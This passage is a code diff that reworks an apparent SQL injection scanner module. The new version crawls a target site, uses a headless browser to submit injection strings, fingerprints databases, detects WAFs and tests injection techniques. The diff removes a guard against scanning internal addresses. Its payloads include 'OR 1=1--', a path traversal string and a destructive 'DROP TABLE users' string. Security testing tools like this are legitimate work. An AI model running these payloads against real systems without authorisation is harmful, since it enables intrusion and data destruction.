-                blacklist = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
-                if any(bl in parsed.netloc.lower() for bl in blacklist):
-                    self.logger.warning(f"Blocked scan of internal address: {parsed.netloc}")
-                    return False
-                
-            return True
-        except Exception as e:
-            self.logger.error(f"Target validation failed: {e}")
-            return False
-    
     async def scan(self, config: ScanConfig) -> ScanResult:
-        """Perform comprehensive SQL injection scan."""
+        """
+        Main scan entry point implementing comprehensive 4-phase methodology.
+        """
         started_at = datetime.utcnow()
         vulnerabilities = []
         errors = []
         warnings = []
+        
         info = {
-            'tested_parameters': [],
-            'vulnerable_parameters': [],
-            'injection_types': [],
-            'database_type': None,
-            'detection_methods': [],
-            'second_order_candidates': [],
-            'crawled_urls': [],
-            'forms_found': [],
-        }
-        scan_statistics = {
-            'urls_tested': 0,
-            'parameters_tested': 0,
-            'payloads_sent': 0,
-            'vulnerabilities_found': 0,
-            'injection_points': 0,
-            'false_positives_filtered': 0,
-            'payloads_by_type': {
-                'error-based': 0,
-                'time-based': 0,
-                'boolean-based': 0,
-                'union-based': 0,
-                'other': 0
-            }
+            'phase_1_discovery': {},
+            'phase_2_analysis': {},
+            'phase_3_testing': {},
+            'phase_4_verification': {},
+            'scan_summary': {}
         }
         
         try:
@@ -604,1039 +308,1156 @@ class SQLInjectionScanner(BaseScannerModule):
             if not target_url.startswith(('http://', 'https://')):
                 target_url = f"https://{target_url}"
             
-            # Phase 0: Web crawling to discover URLs and forms
-            if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
-                self.logger.info(f"Starting web crawling for {target_url}")
-                crawl_results = await self.crawler.crawl(target_url, self.connection_pool)
-                info['crawled_urls'] = crawl_results['discovered_urls']
-                info['forms_found'] = crawl_results['forms']
-                scan_statistics['urls_tested'] = len(crawl_results['discovered_urls'])
+            self.client = httpx.AsyncClient(
+                verify=False,
+                timeout=30.0,
+                follow_redirects=True,
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+            )
+            
+            logger.info("="*70)
+            logger.info("SQL INJECTION SCANNER - 4-PHASE COMPREHENSIVE ANALYSIS")
+            logger.info("="*70)
+            logger.info(f"Target: {target_url}")
+            logger.info(f"Scan Type: {config.scan_type.value}")
+            
+            # ============================================================
+            # PHASE 1: DISCOVERY/CRAWLING
+            # ============================================================
+            logger.info("\n" + "="*70)
+            logger.info("PHASE 1: DISCOVERY & CRAWLING")
+            logger.info("="*70)
+            logger.info("Objective: Find all injection points (URLs, forms, parameters)")
+            
+            discovery_result = await self._phase1_discovery(target_url, config)
+            info['phase_1_discovery'] = discovery_result
+            
+            logger.info(f"\n✓ Discovery Complete:")
+            logger.info(f"  - URLs Crawled: {discovery_result['urls_crawled']}")
+            logger.info(f"  - Injection Points Found: {discovery_result['injection_points_found']}")
+            logger.info(f"  - Forms Discovered: {discovery_result['forms_found']}")
+            logger.info(f"  - API Endpoints: {discovery_result['api_endpoints_found']}")
+            
+            if not self.injection_points:
+                warnings.append("No injection points discovered. Target may require authentication or has no testable parameters.")
+                logger.warning("⚠ No injection points found!")
+            
+            # ============================================================
+            # PHASE 2: ANALYSIS
+            # ============================================================
+            logger.info("\n" + "="*70)
+            logger.info("PHASE 2: ANALYSIS & FINGERPRINTING")
+            logger.info("="*70)
+            logger.info("Objective: Identify database type and establish baselines")
+            
+            analysis_result = await self._phase2_analysis(config)
+            info['phase_2_analysis'] = analysis_result
+            
+            logger.info(f"\n✓ Analysis Complete:")
+            logger.info(f"  - Database Detected: {analysis_result['database_type'] or 'Unknown'}")
+            logger.info(f"  - WAF Detected: {analysis_result['waf_detected']}")
+            logger.info(f"  - Baselines Established: {analysis_result['baselines_established']}")
+            
+            # ============================================================
+            # PHASE 3: TESTING
+            # ============================================================
+            logger.info("\n" + "="*70)
+            logger.info("PHASE 3: INJECTION TESTING")
+            logger.info("="*70)
+            logger.info("Objective: Test all injection techniques systematically")
+            
+            testing_result = await self._phase3_testing(config)
+            vulnerabilities.extend(testing_result['vulnerabilities'])
+            info['phase_3_testing'] = testing_result
+            
+            logger.info(f"\n✓ Testing Complete:")
+            logger.info(f"  - Total Tests Executed: {testing_result['total_tests']}")
+            logger.info(f"  - Injection Points Tested: {testing_result['points_tested']}")
+            logger.info(f"  - Vulnerabilities Found: {len(testing_result['vulnerabilities'])}")
+            logger.info(f"  - Techniques Used: {', '.join(testing_result['techniques_used'])}")
+            
+            # ============================================================
+            # PHASE 4: VERIFICATION
+            # ============================================================
+            logger.info("\n" + "="*70)
+            logger.info("PHASE 4: VERIFICATION & IMPACT ASSESSMENT")
+            logger.info("="*70)
+            logger.info("Objective: Confirm findings and assess exploitability")
+            
+            if vulnerabilities:
+                verification_result = await self._phase4_verification(vulnerabilities, config)
+                info['phase_4_verification'] = verification_result
+                vulnerabilities = verification_result['verified_vulnerabilities']
                 
-                # Prioritize URLs with parameters for testing
-                urls_to_test = crawl_results['urls_with_params'][:10] if crawl_results['urls_with_params'] else [target_url]
+                logger.info(f"\n✓ Verification Complete:")
+                logger.info(f"  - Verified Vulnerabilities: {len(vulnerabilities)}")
+                logger.info(f"  - False Positives Filtered: {verification_result['false_positives']}")
             else:
-                urls_to_test = [target_url]
-                scan_statistics['urls_tested'] = 1
+                info['phase_4_verification'] = {'message': 'No vulnerabilities to verify'}
+                logger.info("\n✓ No vulnerabilities found to verify")
             
-            if config.scan_type == ScanType.PASSIVE:
-                # Passive scan on all discovered URLs
-                for test_url in urls_to_test:
-                    passive_vulns = await self._passive_sql_check(test_url)
-                    vulnerabilities.extend(passive_vulns)
+            # ============================================================
+            # SCAN SUMMARY
+            # ============================================================
+            logger.info("\n" + "="*70)
+            logger.info("SCAN COMPLETE - SUMMARY")
+            logger.info("="*70)
+            
+            info['scan_summary'] = {
+                'total_injection_points': len(self.injection_points),
+                'points_tested': len(self.tested_points),
+                'vulnerabilities_found': len(vulnerabilities),
+                'database_type': self.detected_db,
+                'waf_present': self.waf_detected,
+                'scan_duration': (datetime.utcnow() - started_at).total_seconds()
+            }
+            
+            if vulnerabilities:
+                logger.info(f"⚠ VULNERABILITIES FOUND: {len(vulnerabilities)}")
+                severity_counts = {}
+                for vuln in vulnerabilities:
+                    sev = vuln.severity.value
+                    severity_counts[sev] = severity_counts.get(sev, 0) + 1
+                
+                for severity, count in sorted(severity_counts.items()):
+                    logger.info(f"  - {severity.upper()}: {count}")
             else:
-                # Test each discovered URL
-                for test_url in urls_to_test:
-                    self.logger.info(f"Testing URL: {test_url}")
-                    
-                    # Phase 1: Initial reconnaissance
-                    recon_data = await self._reconnaissance_phase(test_url, config)
-                    if not info['database_type']:
-                        info['database_type'] = recon_data.get('database_type')
-                
-                    # Phase 2: Enhanced manual testing with dynamic payloads
-                    manual_results = await self._enhanced_manual_testing(
-                        test_url, config, recon_data.get('database_type')
-                    )
-                    vulnerabilities.extend(manual_results['vulnerabilities'])
-                    info['tested_parameters'].extend(manual_results['tested_params'])
-                    scan_statistics['parameters_tested'] += len(manual_results['tested_params'])
-                    scan_statistics['payloads_sent'] += manual_results.get('payloads_sent', 0)
-                    
-                    # Update payload type statistics
-                    for ptype, count in manual_results.get('payloads_by_type', {}).items():
-                        if ptype in scan_statistics['payloads_by_type']:
-                            scan_statistics['payloads_by_type'][ptype] += count
-                    scan_statistics['false_positives_filtered'] += manual_results.get('false_positives', 0)
-                
-                    # Phase 3: Advanced time-based detection with statistical analysis
-                    if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
-                        time_based_results = await self._advanced_time_based_detection(
-                            test_url, config, recon_data.get('database_type')
-                        )
-                        vulnerabilities.extend(time_based_results['vulnerabilities'])
-                        if 'Statistical Time-Based Analysis' not in info['detection_methods']:
-                            info['detection_methods'].append('Statistical Time-Based Analysis')
-                
-                    # Phase 4: Second-order SQL injection detection
-                    if config.scan_type == ScanType.AGGRESSIVE:
-                        second_order_results = await self._second_order_detection(test_url, config)
-                        vulnerabilities.extend(second_order_results['vulnerabilities'])
-                        info['second_order_candidates'].extend(second_order_results.get('candidates', []))
-                        if second_order_results['vulnerabilities'] and 'Second-Order SQLi' not in info['detection_methods']:
-                            info['detection_methods'].append('Second-Order SQLi')
-                
-                    # Phase 5: Form testing with context awareness
-                    form_results = await self._context_aware_form_testing(
-                        test_url, config, recon_data.get('database_type')
-                    )
-                    vulnerabilities.extend(form_results)
-                
-                    # Phase 6: SQLMap integration (if available and aggressive)
-                    if config.scan_type == ScanType.AGGRESSIVE and self._is_sqlmap_available():
-                        sqlmap_results = await self._intelligent_sqlmap_integration(
-                            test_url, config, recon_data
-                        )
-                        if sqlmap_results:
-                            vulnerabilities.extend(sqlmap_results['vulnerabilities'])
-                            info['vulnerable_parameters'].extend(sqlmap_results.get('vulnerable_params', []))
-                            if not info['database_type']:
-                                info['database_type'] = sqlmap_results.get('database_type')
+                logger.info("✓ No SQL injection vulnerabilities detected")
             
-            # Deduplicate vulnerabilities
-            vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)
-            scan_statistics['vulnerabilities_found'] = len(vulnerabilities)
-            scan_statistics['injection_points'] = len(set(v.evidence.get('parameter', '') for v in vulnerabilities))
-            
-            # Determine injection types
-            injection_types = set()
-            for vuln in vulnerabilities:
-                vuln_type = vuln.evidence.get('injection_type', vuln.name.split()[0])
-                injection_types.add(vuln_type)
-            info['injection_types'] = list(injection_types)
+            logger.info(f"\nDatabase: {self.detected_db or 'Unknown'}")
+            logger.info(f"WAF: {'Detected' if self.waf_detected else 'Not Detected'}")
+            logger.info(f"Duration: {info['scan_summary']['scan_duration']:.2f}s")
             
         except Exception as e:
-            error_msg = f"SQL injection scan failed: {str(e)}"
-            self.logger.error(error_msg)
+            error_msg = f"Scan failed: {str(e)}"
+            logger.error(error_msg, exc_info=True)
             errors.append(error_msg)
-        
-        completed_at = datetime.utcnow()
+        finally:
+            if self.client:
+                await self.client.aclose()
         
         return ScanResult(
             module_name=self.name,
             success=len(errors) == 0,
             started_at=started_at,
-            completed_at=completed_at,
-            vulnerabilities=vulnerabilities,
+            completed_at=datetime.utcnow(),
+            vulnerabilities=self._deduplicate_vulnerabilities(vulnerabilities),
             errors=errors,
             warnings=warnings,
-            info=info,
-            statistics=scan_statistics
+            info=info
         )
     
-    async def _reconnaissance_phase(self, url: str, config: ScanConfig) -> Dict[str, Any]:
-        """Perform initial reconnaissance to identify database type and structure."""
-        recon_data = {
-            'database_type': None,
-            'urls_found': 1,
-            'parameters': [],
-            'forms': []
+    # ================================================================
+    # PHASE 1: DISCOVERY/CRAWLING METHODS
+    # ================================================================
+    
+    async def _phase1_discovery(self, url: str, config: ScanConfig) -> Dict[str, Any]:
+        """
+        Phase 1: Comprehensive Discovery and Crawling
+        - Spider the website to find all URLs
+        - Identify all entry points (forms, parameters, APIs)
+        - Extract testable parameters from all sources
+        """
+        result = {
+            'urls_crawled': 0,
+            'injection_points_found': 0,
+            'forms_found': 0,
+            'api_endpoints_found': 0,
+            'discovery_methods': []
         }
         
+        # Try browser-based discovery for SPAs
+        if PYPPETEER_AVAILABLE and config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
+            try:
+                logger.info("→ Attempting browser-based discovery (SPA support)...")
+                await self._discover_with_browser(url, config)
+                if self.injection_points:
+                    result['discovery_methods'].append('browser')
+                    logger.info(f"  ✓ Browser discovery successful")
+            except Exception as e:
+                logger.warning(f"  ✗ Browser discovery failed: {e}")
+        
+        # Always perform static discovery as well
+        logger.info("→ Performing static discovery...")
+        await self._discover_static(url, config)
+        result['discovery_methods'].append('static')
+        
+        # Crawl additional pages
+        logger.info("→ Crawling website...")
+        await self._crawl_website(url, config, max_depth=2)
+        
+        # Update results
+        result['urls_crawled'] = len(self.crawled_urls)
+        result['injection_points_found'] = len(self.injection_points)
+        
+        # Count forms and API endpoints
+        for point in self.injection_points:
+            if point.param_type == 'post':
+                result['forms_found'] += 1
+            if '/api/' in point.url or '/rest/' in point.url:
+                result['api_endpoints_found'] += 1
+        
+        return result
+    
+    async def _discover_with_browser(self, url: str, config: ScanConfig):
+        """Use Pyppeteer to discover API endpoints in SPAs."""
+        browser = None
         try:
-            async with httpx.AsyncClient(verify=False, timeout=10) as client:
-                response = await client.get(url)
+            logger.info("  → Launching headless browser...")
+            browser = await launch(
+                headless=True,
+                args=[
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu'
+                ],
+                handleSIGINT=False,
+                handleSIGTERM=False,
+                handleSIGHUP=False
+            )
+            
+            page = await browser.newPage()
+            await page.setRequestInterception(True)
+            
+            captured_requests = []
+            
+            async def intercept(request):
+                """Intercept and capture API requests."""
+                req_url = request.url
+                method = request.method
                 
-                # Detect database type from error messages
-                for pattern, confidence, db_type in self.sql_error_patterns:
-                    if re.search(pattern, response.text, re.IGNORECASE):
-                        recon_data['database_type'] = db_type
-                        break
+                # Capture API endpoints
+                if any(pattern in req_url.lower() for pattern in [
+                    '/api/', '/rest/', '/v1/', '/v2/', '/graphql',
+                    '/products', '/users', '/search', '/login', '/data'
+                ]):
+                    captured_requests.append({
+                        'url': req_url,
+                        'method': method,
+                        'headers': request.headers,
+                        'post_data': request.postData
+                    })
+                    logger.debug(f"  → Captured: {method} {req_url}")
                 
-                # Look for database fingerprints in headers and content
-                if not recon_data['database_type']:
-                    recon_data['database_type'] = self._fingerprint_database(response)
-                
-                # Extract parameters
-                parsed = urlparse(url)
-                params = parse_qs(parsed.query)
-                recon_data['parameters'] = list(params.keys())
-                
+                await request.continue_()
+            
+            page.on('request', lambda req: asyncio.create_task(intercept(req)))
+            
+            # Navigate to page
+            logger.info(f"  → Navigating to {url}...")
+            await page.goto(url, {'waitUntil': 'networkidle0', 'timeout': 45000})
+            await asyncio.sleep(2)
+            
+            # Interact with common elements
+            await self._interact_with_page(page)
+            
+            # Process captured requests
+            for req in captured_requests:
+                await self._extract_injection_points_from_request(
+                    req['url'], req['method'], req.get('post_data')
+                )
+            
+            logger.info(f"  ✓ Captured {len(captured_requests)} API requests")
+            
         except Exception as e:
-            self.logger.debug(f"Reconnaissance phase error: {e}")
-        
-        return recon_data
+            logger.error(f"  ✗ Browser discovery error: {e}")
+            raise
+        finally:
+            if browser:
+                await browser.close()
     
-    def _fingerprint_database(self, response: httpx.Response) -> Optional[str]:
-        """Fingerprint database from response characteristics."""
-        headers = str(response.headers).lower()
-        content = response.text.lower()
-        
-        # Check headers
-        if 'x-powered-by' in headers:
-            powered_by = response.headers.get('X-Powered-By', '').lower()
-            if 'php' in powered_by:
-                return 'mysql'  # Common combo
-            elif 'asp.net' in powered_by:
-                return 'mssql'  # Common combo
-        
-        # Check for database-specific keywords in content
-        if 'phpmyadmin' in content or 'mysql' in content:
-            return 'mysql'
-        elif 'pgadmin' in content or 'postgresql' in content:
-            return 'postgresql'
-        elif 'oracle' in content:
-            return 'oracle'
-        
-        return None
+    async def _interact_with_page(self, page):
+        """Interact with page elements to trigger API calls."""
+        try:
+            # Try search functionality
+            search_selectors = [
+                '#searchQuery', '#search', 'input[type="search"]',
+                'input[placeholder*="search" i]', '.search-input', '#q'
+            ]
+            
+            for selector in search_selectors:
+                try:
+                    elem = await page.querySelector(selector)
+                    if elem:
+                        await elem.type("test' OR 1=1--")
+                        await page.keyboard.press('Enter')
+                        await asyncio.sleep(1)
+                        break
+                except:
+                    pass
+            
+            # Click some links
+            links = await page.querySelectorAll('a[href]')
+            for link in links[:5]:
+                try:
+                    href = await page.evaluate('(element) => element.href', link)
+                    if href and not href.startswith(('javascript:', 'mailto:', '#')):
+                        await link.click()
+                        await asyncio.sleep(1)
+                except:
+                    pass
+            
+            # Try buttons
+            buttons = await page.querySelectorAll('button')
+            for button in buttons[:3]:
+                try:
+                    await button.click()
+                    await asyncio.sleep(1)
+                except:
+                    pass
+                    
+        except Exception as e:
+            logger.debug(f"  → Page interaction error: {e}")
     
-    async def _enhanced_manual_testing(self, url: str, config: ScanConfig, db_type: Optional[str]) -> Dict[str, Any]:
-        """Enhanced manual testing with dynamic payloads."""
-        vulnerabilities = []
-        tested_params = []
-        payloads_sent = 0
-        false_positives = 0
-        found_error_based = False  # Track if we found error-based SQLi
+    async def _discover_static(self, url: str, config: ScanConfig):
+        """Static endpoint discovery and parameter extraction."""
+        try:
+            response = await self.client.get(url)
+            self.crawled_urls.add(url)
+            
+            # Extract parameters from current URL
+            await self._extract_injection_points_from_url(url)
+            
+            # Parse HTML for forms and links
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Extract forms
+            forms = soup.find_all('form')
+            for form in forms:
+                await self._extract_injection_points_from_form(form, url)
+            
+            # Find API endpoints in JavaScript
+            api_patterns = [
+                r'["\']([^"\']*(?:/api|/rest|/v\d|/graphql)/[^"\']*)["\']',
+                r'fetch\(["\']([^"\']+)["\']',
+                r'axios\.[a-z]+\(["\']([^"\']+)["\']',
+                r'\.get\(["\']([^"\']+)["\']',
+                r'\.post\(["\']([^"\']+)["\']',
+            ]
+            
+            for pattern in api_patterns:
+                matches = re.findall(pattern, response.text, re.IGNORECASE)
+                for match in matches:
+                    full_url = urljoin(url, match)
+                    if urlparse(full_url).netloc == urlparse(url).netloc:
+                        await self._extract_injection_points_from_url(full_url)
+            
+            # Try common API endpoints
+            common_endpoints = [
+                '/api/search', '/api/products', '/api/users', '/api/data',
+                '/rest/search', '/rest/products', '/rest/users',
+                '/v1/search', '/v2/search',
+                '/search', '/products', '/items'
+            ]
+            
+            for endpoint in common_endpoints:
+                test_url = urljoin(url, endpoint)
+                try:
+                    resp = await self.client.get(test_url, timeout=5)
+                    if resp.status_code in [200, 400, 401, 403, 500]:
+                        await self._extract_injection_points_from_url(test_url)
+                except:
+                    pass
+                    
+        except Exception as e:
+            logger.debug(f"Static discovery error: {e}")
+    
+    async def _crawl_website(self, start_url: str, config: ScanConfig, max_depth: int = 2):
+        """Crawl website to find more URLs and injection points."""
+        to_crawl = [(start_url, 0)]
+        crawled = set()
         
+        while to_crawl and len(crawled) < 50:  # Limit crawling
+            url, depth = to_crawl.pop(0)
+            
+            if url in crawled or depth > max_depth:
+                continue
+            
+            try:
+                response = await self.client.get(url, timeout=10)
+                crawled.add(url)
+                self.crawled_urls.add(url)
+                
+                # Extract injection points from this URL
+                await self._extract_injection_points_from_url(url)
+                
+                # Find more links
+                if depth < max_depth:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    for link in soup.find_all('a', href=True):
+                        href = link['href']
+                        full_url = urljoin(url, href)
+                        
+                        # Only crawl same domain
+                        if urlparse(full_url).netloc == urlparse(start_url).netloc:
+                            if full_url not in crawled and not full_url.endswith(('.pdf', '.jpg', '.png', '.gif', '.css', '.js')):
+                                to_crawl.append((full_url, depth + 1))
+                
+            except Exception as e:
+                logger.debug(f"Crawl error for {url}: {e}")
+                continue
+    
+    async def _extract_injection_points_from_url(self, url: str):
+        """Extract injection points from URL query parameters."""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         
-        if not params:
-            common_params = ['id', 'user', 'search', 'q', 'page', 'cat']
-            params = {param: ['1'] for param in common_params[:2]}
+        for param_name, values in params.items():
+            param_value = values[0] if values else ''
+            point = InjectionPoint(
+                url=url,
+                method='GET',
+                param_name=param_name,
+                param_value=param_value,
+                param_type='query'
+            )
+            self.injection_points.add(point)
+    
+    async def _extract_injection_points_from_form(self, form, base_url: str):
+        """Extract injection points from HTML forms."""
+        action = form.get('action', '')
+        method = form.get('method', 'GET').upper()
+        form_url = urljoin(base_url, action) if action else base_url
         
-        async with httpx.AsyncClient(verify=False, timeout=15) as client:
-            # Get baseline response
+        inputs = form.find_all(['input', 'textarea', 'select'])
+        for input_elem in inputs:
+            name = input_elem.get('name')
+            if name:
+                value = input_elem.get('value', '')
+                point = InjectionPoint(
+                    url=form_url,
+                    method=method,
+                    param_name=name,
+                    param_value=value,
+                    param_type='post' if method == 'POST' else 'query'
+                )
+                self.injection_points.add(point)
+    
+    async def _extract_injection_points_from_request(self, url: str, method: str, post_data: Optional[str] = None):
+        """Extract injection points from captured requests."""
+        # Extract from URL parameters
+        await self._extract_injection_points_from_url(url)
+        
+        # Extract from POST data
+        if post_data and method in ['POST', 'PUT', 'PATCH']:
             try:
-                baseline_response = await self._rate_limited_request(client, url, config)
-                baseline_data = self._extract_response_features(baseline_response)
-            except (httpx.HTTPError, asyncio.TimeoutError) as e:
-                self.logger.debug(f"Baseline request failed: {e}")
-                return {'vulnerabilities': [], 'tested_params': [], 'payloads_sent': 0}
-            
-            for param_name, param_values in params.items():
-                tested_params.append(param_name)
-                original_value = param_values[0] if param_values else '1'
-                
-                # Detect injection context
-                context = self._detect_injection_context(url, param_name)
-                
-                # Generate context-aware payloads
-                payloads = self.payload_generator.generate_payloads(context, db_type)
-                
-                # Test all injection types, not just until first found
-                for payload_info in payloads[:20]:  # Test more payloads for thoroughness
-                    payload = payload_info['payload']
-                    payload_type = payload_info['type']
-                    
-                    test_params = params.copy()
-                    test_params[param_name] = [original_value + payload]
-                    test_query = urlencode(test_params, doseq=True)
-                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
-                    
+                # Try JSON
+                json_data = json.loads(post_data)
+                for key, value in json_data.items():
+                    if isinstance(value, (str, int, float)):
+                        point = InjectionPoint(
+                            url=url,
+                            method=method,
+                            param_name=key,
+                            param_value=str(value),
+                            param_type='json'
+                        )
+                        self.injection_points.add(point)
+            except:
+                # Try form data
+                try:
+                    form_data = parse_qs(post_data)
+                    for param_name, values in form_data.items():
+                        param_value = values[0] if values else ''
+                        point = InjectionPoint(
+                            url=url,
+                            method=method,
+                            param_name=param_name,
+                            param_value=param_value,
+                            param_type='post'
+                        )
+                        self.injection_points.add(point)
+                except:
+                    pass
+    
+    # ================================================================
+    # PHASE 2: ANALYSIS METHODS
+    # ================================================================
+    
+    async def _phase2_analysis(self, config: ScanConfig) -> Dict[str, Any]:
+        """
+        Phase 2: Analysis and Fingerprinting
+        - Determine database type
+        - Establish response baselines
+        - Detect WAF/IDS presence
+        """
+        result = {
+            'database_type': None,
+            'waf_detected': False,
+            'baselines_established': 0,
+        }
+        
+        if not self.injection_points:
+            return result
+        
+        # Fingerprint database
+        logger.info("→ Fingerprinting database...")
+        db_type = await self._fingerprint_database()
+        result['database_type'] = db_type
+        self.detected_db = db_type
+        if db_type:
+            logger.info(f"  ✓ Database identified: {db_type}")
+        else:
+            logger.info(f"  ℹ Database type unknown")
+        
+        # Establish baselines
+        logger.info("→ Establishing response baselines...")
+        baseline_count = 0
+        for point in list(self.injection_points)[:10]:  # Limit to first 10
+            baseline = await self._establish_baseline(point)
+            if baseline:
+                point_key = f"{point.method}:{point.url}:{point.param_name}"
+                self.baselines[point_key] = baseline
+                baseline_count += 1
+        
+        result['baselines_established'] = baseline_count
+        logger.info(f"  ✓ Established {baseline_count} baselines")
+        
+        # Detect WAF
+        logger.info("→ Detecting WAF/IDS...")
+        waf_detected = await self._detect_waf()
+        result['waf_detected'] = waf_detected
+        self.waf_detected = waf_detected
+        if waf_detected:
+            logger.warning("  ⚠ WAF/IDS detected - may affect testing")
+        else:
+            logger.info("  ✓ No WAF detected")
+        
+        return result
+    
+    async def _fingerprint_database(self) -> Optional[str]:
+        """Fingerprint the database type."""
+        if not self.injection_points:
+            return None
+        
+        # Test with first few injection points
+        test_points = list(self.injection_points)[:3]
+        
+        for db_type, fingerprints in self.DB_FINGERPRINTS.items():
+            for payload, pattern, confidence in fingerprints:
+                for point in test_points:
                     try:
-                        response = await self._rate_limited_request(client, test_url, config, timeout=15)
-                        payloads_sent += 1
-                        
-                        # Track payload types
-                        if 'error' in payload_type:
-                            payload_type_key = 'error-based'
-                        elif 'time' in payload_type:
-                            payload_type_key = 'time-based'
-                        elif 'boolean' in payload_type:
-                            payload_type_key = 'boolean-based'
-                        elif 'union' in payload_type:
-                            payload_type_key = 'union-based'
-                        else:
-                            payload_type_key = 'other'
-                        
-                        # Enhanced error-based detection
-                        if 'error' in payload_type:
-                            error_result = self._enhanced_error_detection(
-                                response, baseline_response, payload_info
-                            )
-                            if error_result['vulnerable']:
-                                # Verify to reduce false positives
-                                if await self._verify_sql_injection(client, test_url, param_name, params):
-                                    vuln = self._create_vulnerability(
-                                        param_name, url, payload_info, error_result, 'Error-Based'
-                                    )
-                                    vulnerabilities.append(vuln)
-                                    found_error_based = True
-                                    continue  # Continue to test other types
-                                else:
-                                    false_positives += 1
-                        
-                        # Boolean-based detection
-                        if payload_type in ['boolean-true', 'boolean-false'] and not found_error_based:
-                            boolean_result = await self._enhanced_boolean_detection(
-                                client, url, param_name, params, original_value, baseline_data, config
-                            )
-                            if boolean_result['vulnerable']:
-                                vuln = self._create_vulnerability(
-                                    param_name, url, payload_info, boolean_result, 'Boolean-Based Blind'
-                                )
-                                vulnerabilities.append(vuln)
-                                continue  # Continue testing other types
+                        response = await self._send_payload(point, payload)
+                        if response:
+                            # Check for database-specific patterns
+                            if pattern and re.search(pattern, response.text, re.IGNORECASE):
+                                return db_type
+                            
+                            # Check for database-specific errors
+                            for error_pattern, error_conf, error_db in self.SQL_ERRORS:
+                                if error_db == db_type and re.search(error_pattern, response.text, re.IGNORECASE):
+                                    return db_type
+                    except:
+                        continue
+        
+        return None
+    
+    async def _establish_baseline(self, point: InjectionPoint) -> Optional[Dict[str, Any]]:
+        """Establish baseline response for an injection point."""
+        try:
+            response_times = []
+            response_sizes = []
+            status_codes = []
+            
+            # Make 3 requests to establish baseline
+            for _ in range(3):
+                start_time = time.time()
+                response = await self._send_payload(point, point.param_value)
+                elapsed = time.time() - start_time
+                
+                if response:
+                    response_times.append(elapsed)
+                    response_sizes.append(len(response.text))
+                    status_codes.append(response.status_code)
+                
+                await asyncio.sleep(0.3)
+            
+            if response_times:
+                return {
+                    'avg_response_time': statistics.mean(response_times),
+                    'avg_response_size': statistics.mean(response_sizes),
+                    'typical_status_code': max(set(status_codes), key=status_codes.count),
+                    'response_time_stddev': statistics.stdev(response_times) if len(response_times) > 1 else 0
+                }
+        except Exception as e:
+            logger.debug(f"Baseline establishment failed: {e}")
+        
+        return None
+    
+    async def _detect_waf(self) -> bool:
+        """Detect presence of WAF/IDS."""
+        if not self.injection_points:
+            return False
+        
+        waf_test_payloads = [
+            "' OR '1'='1",
+            "<script>alert(1)</script>",
+            "../../etc/passwd",
+            "'; DROP TABLE users--"
+        ]
+        
+        test_point = list(self.injection_points)[0]
+        
+        for payload in waf_test_payloads:
+            try:
+                response = await self._send_payload(test_point, payload)
+                if response:
+                    # Check for WAF signatures
+                    waf_signatures = [
+                        'cloudflare', 'incapsula', 'imperva', 'f5', 'barracuda',
+                        'mod_security', 'naxsi', 'blocked', 'forbidden', 'access denied',
+                        'security', 'firewall', 'protected'
+                    ]
                     
-                    except asyncio.TimeoutError:
-                        if 'time-based' in payload_type:
-                            # Will be handled by advanced time-based detection
-                            self.logger.debug(f"Timeout on time-based payload for {param_name}")
-                    except (httpx.HTTPError, Exception) as e:
-                        self.logger.debug(f"Request failed for {param_name}: {e}")
+                    response_text = response.text.lower()
+                    for sig in waf_signatures:
+                        if sig in response_text:
+                            return True
+                    
+                    # Check for suspicious status codes
+                    if response.status_code in [403, 406, 419, 429, 501, 503]:
+                        return True
+            except:
+                pass
+        
+        return False
+    
+    # ================================================================
+    # PHASE 3: TESTING METHODS
+    # ================================================================
+    
+    async def _phase3_testing(self, config: ScanConfig) -> Dict[str, Any]:
+        """
+        Phase 3: Comprehensive Injection Testing
+        - Test error-based injection
+        - Test boolean-based blind injection
+        - Test time-based blind injection
+        - Test union-based injection
+        """
+        vulnerabilities = []
+        total_tests = 0
+        techniques_used = set()
+        
+        if not self.injection_points:
+            return {
+                'vulnerabilities': [],
+                'total_tests': 0,
+                'points_tested': 0,
+                'techniques_used': []
+            }
+        
+        # Select payloads based on detected database
+        payload_sets = self._select_payload_sets()
+        
+        # Test each injection point
+        for point in self.injection_points:
+            if point in self.tested_points:
+                continue
+            
+            logger.info(f"→ Testing: {point.method} {point.url} [{point.param_name}]")
+            
+            # Test each technique
+            for technique, payloads in payload_sets.items():
+                logger.debug(f"  → Technique: {technique}")
+                techniques_used.add(technique)
+                
+                vulns = await self._test_technique(point, technique, payloads)
+                vulnerabilities.extend(vulns)
+                total_tests += len(payloads)
+                
+                # If vulnerability found, move to next point
+                if vulns:
+                    logger.info(f"  ✓ Vulnerability found: {technique}")
+                    break
+            
+            self.tested_points.add(point)
         
         return {
             'vulnerabilities': vulnerabilities,
-            'tested_params': tested_params,
-            'payloads_sent': payloads_sent,
-            'false_positives': false_positives,
-            'payloads_by_type': {
-                'error-based': sum(1 for p in payloads[:payloads_sent] if 'error' in p.get('type', '')),
-                'time-based': sum(1 for p in payloads[:payloads_sent] if 'time' in p.get('type', '')),
-                'boolean-based': sum(1 for p in payloads[:payloads_sent] if 'boolean' in p.get('type', '')),
-                'union-based': sum(1 for p in payloads[:payloads_sent] if 'union' in p.get('type', '')),
-            }
+            'total_tests': total_tests,
+            'points_tested': len(self.tested_points),
+            'techniques_used': list(techniques_used)
         }
     
-    def _detect_injection_context(self, url: str, param_name: str) -> str:
-        """Detect the SQL context of the injection point."""
-        # Heuristics to detect context
-        param_lower = param_name.lower()
+    def _select_payload_sets(self) -> Dict[str, List]:
+        """Select appropriate payloads based on detected database."""
+        payload_sets = {}
         
-        if 'sort' in param_lower or 'order' in param_lower:
-            return 'order_by'
-        elif 'search' in param_lower or 'query' in param_lower:
-            return 'where'
-        else:
-            return 'generic'
-    
-    def _extract_response_features(self, response: httpx.Response) -> Dict[str, Any]:
-        """Extract features from response for comparison."""
-        return {
-            'status_code': response.status_code,
-            'length': len(response.text),
